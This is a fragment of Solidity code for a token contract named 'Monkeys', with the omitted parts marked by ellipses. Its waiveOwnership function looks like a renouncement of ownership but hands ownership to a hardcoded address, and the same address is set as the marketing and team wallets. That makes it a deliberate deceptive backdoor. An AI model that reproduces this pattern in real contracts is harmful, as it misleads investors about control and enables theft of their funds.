...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x77b183337dEDc25D497a6B00eBb1d34c8fb82779));
        _owner = address(0x77b183337dEDc25D497a6B00eBb1d34c8fb82779);
    }
...
contract Monkeys is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x77b183337dEDc25D497a6B00eBb1d34c8fb82779);
    address payable public teamWalletAddress = payable(0x77b183337dEDc25D497a6B00eBb1d34c8fb82779);
